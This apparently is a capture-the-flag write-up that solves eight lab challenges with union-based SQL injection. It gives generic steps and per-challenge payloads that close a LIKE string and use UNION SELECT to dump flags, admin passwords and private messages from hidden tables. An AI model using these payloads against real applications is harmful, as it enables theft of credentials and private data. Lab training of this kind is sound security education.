
# User Exploitation Report

Each challenge accepts a single search input that ends up in a query similar to:
```sql
SELECT col1, col2, ... FROM table WHERE name LIKE '%<input>%'
```
Because the input is concatenated without sanitization, you can close the string and use `UNION SELECT` to pull data from hidden tables that contain the flag.

## Generic Steps (works across challenges)
1. **Find column count**  
   Use `ORDER BY` or UNION with `NULL`s to discover how many columns are selected, e.g.  
   `%' UNION SELECT NULL, NULL, NULL -- -`
2. **Find displayable columns**  
   Replace some `NULL`s with text to see which columns render on the page.  
3. **Extract flag**  
   Once you know the column count and at least one text-capable column, target the hidden table.

### Example – Challenge 1 (Employee Directory)
Base query:
```sql
SELECT id, name, position, email FROM employees WHERE name LIKE '%nidhi%'
```
Thus there are **4 columns**. A working UNION could be:
```
%' UNION SELECT 1, flag, 'x', 'y' FROM secrets -- -
```
The `flag` value shows up in the results list.

### Example – Challenge 2 (E‑Commerce)
Base query selects 3 columns (`id, name, price`). A working UNION could be:
```
%' UNION SELECT 1, username, 0 FROM users -- -
```
Then pivot to the admin row to read the flag in `password` or change the column to `password`:
```
%' UNION SELECT 1, password, 0 FROM users WHERE username='admin' -- -
```

### Example – Challenge 3 (Student Portal)
```
%' UNION SELECT 1, secret, 'x' FROM admin_notes -- -
```

### Example – Challenge 4 (Bank)
```
%' UNION SELECT 1, username, 0, 'x' FROM accounts -- -
%' UNION SELECT 1, password, 0, 'x' FROM accounts WHERE username='admin' -- -
```

### Example – Challenge 5 (Flights)
```
%' UNION SELECT 1, route, 0 FROM hidden_routes -- -
```

### Example – Challenge 6 (Tickets)
```
%' UNION SELECT 1, note, 'x' FROM internal_notes -- -
```

### Example – Challenge 7 (Movies)
```
%' UNION SELECT 1, flag, 0 FROM hidden_flags -- -
```

### Example – Challenge 8 (Forum)
```
%' UNION SELECT 1, sender, message FROM private_messages -- -
%' UNION SELECT 1, 'FLAG', message FROM private_messages WHERE sender='admin' -- -
```

**Recognition**: The use of `UNION SELECT` to pull data from unrelated tables, and the need to match column counts and types, identifies this as **Union-based SQL Injection**.
